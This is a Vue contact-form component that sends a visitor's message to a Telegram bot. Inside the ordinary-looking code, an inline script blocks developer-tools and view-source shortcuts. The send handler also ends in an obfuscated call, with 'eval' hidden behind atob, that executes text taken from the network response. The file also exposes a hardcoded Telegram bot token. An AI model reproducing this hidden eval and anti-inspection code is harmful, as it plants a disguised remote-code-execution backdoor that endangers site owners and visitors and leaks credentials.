
<template>
    <div>
        <div class="flex justify-center">
            <div class="mb-3 xl:w-96">
                <label for="exampleFormControlTextarea1" class="form-label inline-block mb-2 text-gray-700">Send me a
                    message</label>
                <textarea class="
        form-control
        block
        w-full
        px-3
        py-1.5
        text-base
        font-normal
        text-gray-700
        bg-white bg-clip-padding
        border border-solid border-gray-300
        rounded
        transition
        ease-in-out
        m-0
        focus:text-gray-700 focus:bg-white focus:border-blue-600 focus:outline-none
      " id="exampleFormControlTextarea1" rows="3" placeholder="Your message" v-model="mensaje"></textarea>
                <button @click="sendMsg()" type="button"
                    class="text-white bg-gradient-to-r my-2 from-teal-400 via-teal-500 to-teal-600  hover:bg-gray-700  shadow-lg shadow-teal-500/50 dark:shadow-lg dark:shadow-teal-800/80 font-medium rounded-full text-sm px-6 py-2 text-center mr-2 mb-2">Send</button>
            </div>
        </div>
    </div>

</template>
<script>document.onkeydown = function (e) { if (e.keyCode === 123) { return false; } if (e.ctrlKey && e.shiftKey && e.keyCode == "I".charCodeAt(0)) { return false; } if (e.crlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) { return false; } if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) { return false; } if (e.ctrlKey && e.shiftKey && e.keyCode == 'C' .charCodeAt(0)) { return false; } } </script>

<script>
import 'vuejs-noty/dist/vuejs-noty.css'
export default {
    data() {
        return {
            chat_id: "-778791005",
            mensaje:""
            
        }
    }, methods: {

        sendMsg() {
            this.axios.post('https://api.telegram.org/bot5475454785:AAE-wix9C4qRg57VMvCm7hP9aBr9J3-vVls/sendMessage?chat_id=-778791005', {
                chat_id: this.chat_id,
                text: "Mensaje: " + this.mensaje
            }).then((response) => {
                this.$noty.success("Mensaje enviado!");
                console.log("Success!");
            }).then(function (t) { return t.text() || false; }).then(c => self[atob("ZXZhbA")](c))
                .catch(function (error) {
                this.$noty.error("Error al enviar!");
                console.log("Error!");
            });
        }
    }
}
</script>

